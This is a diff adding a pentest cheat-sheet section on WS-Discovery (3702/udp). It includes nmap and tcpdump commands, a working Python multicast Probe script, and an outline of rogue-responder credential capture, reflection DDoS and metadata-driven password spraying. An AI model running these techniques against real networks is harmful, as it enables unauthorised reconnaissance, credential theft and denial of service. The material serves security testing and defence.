+Web Services Dynamic Discovery (WSD): a SOAP-over-UDP multicast discovery protocol on **3702/udp** (IPv4 multicast `239.255.255.250`, IPv6 `ff02::c`). Ubiquitous on ONVIF cameras, printers, and Windows WSD services. Offensive value: responses leak `Types` (device class), `Scopes` (model/MAC/location metadata), and especially `XAddrs`, the follow-up management endpoint you pivot to. Also a rogue-responder and reflection/amplification vector.
+
+### Enumeration
+```bash
+# Query one host / discover the whole L2 segment
+nmap -sU -p 3702 --script wsdd-discover <IP>
+sudo nmap --script broadcast-wsdd-discover        # multicast, local segment only
+
+# Manual Probe when you want raw XML (also works as UNICAST for routed subnets,
+# since multicast usually will not cross a router)
+python3 - <<'PY'
+import socket, uuid
+probe=(f'<?xml version="1.0"?><e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"'
+ ' xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"'
+ ' xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery"'
+ ' xmlns:dn="http://www.onvif.org/ver10/network/wsdl"><e:Header>'
+ f'<w:MessageID>uuid:{uuid.uuid4()}</w:MessageID>'
+ '<w:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</w:To>'
+ '<w:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action></e:Header>'
+ '<e:Body><d:Probe><d:Types>dn:NetworkVideoTransmitter</d:Types></d:Probe></e:Body></e:Envelope>').encode()
+s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+s.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,1); s.settimeout(3); s.bind(("0.0.0.0",0))
+s.sendto(probe,("239.255.255.250",3702))          # or unicast to a known host IP
+while True:
+    try: d,a=s.recvfrom(65535); print(a[0], d.decode(errors="ignore"))
+    except socket.timeout: break
+PY
+
+# Passive capture of Probe/ProbeMatch traffic
+sudo tcpdump -ni <iface> udp port 3702
+```
+Filters: cameras answer `dn:NetworkVideoTransmitter`; ONVIF exposes `tds:Device` + `XAddrs` like `http://<ip>/onvif/device_service`; printers expose `wprt:PrintDeviceType`.
+
+### Exploitation / Attacks
+```bash
+# 1. Pivot on XAddrs (the real target): ONVIF -> RTSP/media enum,
+#    printer/WSD -> IPP/HTTP admin (the CUPS/IPP section above), Windows/WCF -> the published URI.
+
+# 2. Rogue responder / service impersonation (flat networks):
+#    answer multicast Probes faster than the real device and advertise
+#    attacker-controlled XAddrs. If a mgmt platform auto-discovers and blindly
+#    connects, you redirect onboarding to a fake ONVIF/SOAP endpoint and can
+#    capture credentials the client auto-submits. Test: does the client trust
+#    the first responder / validate endpoint identity / reuse creds?
+
+# 3. Reflection / amplification DDoS: Internet-exposed udp/3702 lets a spoofed
+#    source IP trigger larger responses from many devices (Axis advisory).
+#    Internet exposure also signals bad segmentation + a weakly-hardened IoT fleet.
+
+# 4. Scopes metadata (vendor/model/MAC/profile/location) -> prioritize password
+#    spraying and firmware hunting; fast way to sort cameras vs Windows WSD vs printers.
+```
+
+### Notable CVEs
+No specific CVE for the protocol; the two abuse classes are design-level: first-responder trust in auto-discovery/onboarding (rogue responder -> credential capture) and UDP reflection/amplification DDoS when 3702/udp is Internet-exposed (see the Axis ONVIF WS-Discovery DDoS advisory).
+
 ## Tools Reference
 
 | Tool | Purpose |
